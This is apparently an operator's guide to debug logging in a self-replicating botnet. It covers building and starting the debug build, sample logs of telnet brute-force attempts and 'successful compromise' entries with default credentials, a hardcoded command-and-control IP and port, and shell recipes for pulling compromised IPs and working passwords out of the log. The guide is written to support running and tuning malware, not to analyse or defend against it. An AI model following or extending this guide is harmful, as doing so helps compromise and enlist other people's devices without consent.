# Self-Replication Debug Logging Guide

## Overview

This guide explains how to use the enhanced self-replication debug logging system for the bot. The debug logging captures detailed information about self-replication activities and writes them to a log file.

## Features

### 🔍 **Debug Logging Capabilities**
- **Self-replication scanner initialization**
- **Target discovery and brute force attempts**
- **Successful compromises and reporting**
- **CNC connection attempts and status**
- **Timestamps and process IDs for all activities**

### 📝 **Log File Location**
- **Default**: `/tmp/selfrep_debug.log`
- **Format**: Timestamped entries with detailed information
- **Rotation**: Manual cleanup required (log grows over time)

## Quick Start

### 1. **Build Debug Version**
```bash
cd /root/bot
make -f Makefile_debug
```

### 2. **Start with Debug Logging**
```bash
# Option A: Use startup script (recommended)
./start_selfrep_debug.sh

# Option B: Manual start
./selfrep_debug selfrep_debug
```

### 3. **Monitor Debug Log**
```bash
# Real-time monitoring
tail -f /tmp/selfrep_debug.log

# Or use the monitor command
make -f Makefile_debug monitor
```

## Debug Log Examples

### **Scanner Initialization**
```
[2024-01-15 10:30:15] [SELFREP] Bot started with PID: 12345
[2024-01-15 10:30:15] [SELFREP] Initializing self-replication scanner
[2024-01-15 10:30:15] [SCANNER] Scanner process started with PID: 12346
[2024-01-15 10:30:15] [SELFREP] Scanner initialized successfully
```

### **Target Discovery**
```
[2024-01-15 10:30:20] [SCANNER] Attempting to brute force IP 192.168.1.100:23
[2024-01-15 10:30:25] [SCANNER] Attempting to brute force IP 10.0.0.50:23
[2024-01-15 10:30:30] [SCANNER] Attempting to brute force IP 172.16.0.25:23
```

### **Successful Compromises**
```
[2024-01-15 10:31:45] [SCANNER] Reporting successful compromise: 192.168.1.100:23 with auth admin:admin
[2024-01-15 10:32:10] [SCANNER] Reporting successful compromise: 10.0.0.50:23 with auth root:123456
```

### **CNC Connections**
```
[2024-01-15 10:30:15] [SELFREP] Using hardcoded CNC IP for self-rep: 185.247.117.214:59666
[2024-01-15 10:30:16] [SELFREP] Successfully connected to CNC server
```

## Configuration

### **Log File Location**
To change the log file location, modify `main.c`:
```c
// Change this line in main.c
debug_log_init("/tmp/selfrep_debug.log");
// To:
debug_log_init("/path/to/your/custom.log");
```

### **Log Levels**
The debug logging includes different categories:
- `[SELFREP]` - Main bot and self-replication activities
- `[SCANNER]` - Scanner and target discovery activities  
- `[CONNECTION]` - CNC connection activities

## Monitoring and Analysis

### **Real-time Monitoring**
```bash
# Monitor all self-rep activities
tail -f /tmp/selfrep_debug.log

# Filter for specific activities
tail -f /tmp/selfrep_debug.log | grep "SCANNER"
tail -f /tmp/selfrep_debug.log | grep "successful compromise"
```

### **Log Analysis**
```bash
# Count successful compromises
grep "successful compromise" /tmp/selfrep_debug.log | wc -l

# Find most common credentials
grep "with auth" /tmp/selfrep_debug.log | awk '{print $NF}' | sort | uniq -c

# Check connection attempts
grep "Attempting to brute force" /tmp/selfrep_debug.log | wc -l
```

### **Performance Monitoring**
```bash
# Monitor log file size
watch -n 5 'ls -lh /tmp/selfrep_debug.log'

# Check bot process status
ps aux | grep selfrep_debug
```

## Troubleshooting

### **Common Issues**

1. **Log file not created**
   - Check permissions: `ls -la /tmp/selfrep_debug.log`
   - Ensure bot has write access to `/tmp/`

2. **No debug output**
   - Verify debug version is running: `ps aux | grep selfrep_debug`
   - Check if `DEBUG` and `SELFREP` flags are enabled

3. **Log file too large**
   - Rotate log file: `mv /tmp/selfrep_debug.log /tmp/selfrep_debug.log.old`
   - Restart bot to create new log file

### **Debug Commands**
```bash
# Check if debug version is running
ps aux | grep selfrep_debug

# View recent log entries
tail -20 /tmp/selfrep_debug.log

# Check log file permissions
ls -la /tmp/selfrep_debug.log

# Monitor in real-time with timestamps
tail -f /tmp/selfrep_debug.log | while read line; do echo "$(date): $line"; done
```

## Advanced Usage

### **Custom Log Analysis**
```bash
# Extract all IP addresses that were targeted
grep "Attempting to brute force IP" /tmp/selfrep_debug.log | \
  sed 's/.*IP \([0-9.]*\):.*/\1/' | sort | uniq

# Extract successful credentials
grep "successful compromise" /tmp/selfrep_debug.log | \
  sed 's/.*with auth \([^:]*\):\([^ ]*\).*/\1:\2/' | sort | uniq -c

# Timeline analysis
grep "\[20" /tmp/selfrep_debug.log | head -10
```

### **Log Rotation**
```bash
# Create log rotation script
cat > /root/bot/rotate_logs.sh << 'EOF'
#!/bin/bash
DATE=$(date +%Y%m%d_%H%M%S)
mv /tmp/selfrep_debug.log /tmp/selfrep_debug_${DATE}.log
touch /tmp/selfrep_debug.log
chmod 644 /tmp/selfrep_debug.log
EOF

chmod +x /root/bot/rotate_logs.sh
```

## Expected Output

When running successfully, you should see:

1. **Initialization messages** showing bot startup
2. **Scanner activities** showing target discovery
3. **Brute force attempts** for each discovered target
4. **Successful compromises** with credentials used
5. **CNC connections** showing bot registration

The debug log provides complete visibility into the self-replication process, making it easier to monitor, troubleshoot, and analyze bot activities.

## Security Notes

⚠️ **Important**: The debug log contains sensitive information including:
- Target IP addresses
- Successful credentials
- Bot activities

Ensure proper access controls on the log file:
```bash
chmod 600 /tmp/selfrep_debug.log
```

Consider encrypting or securing the log file in production environments.
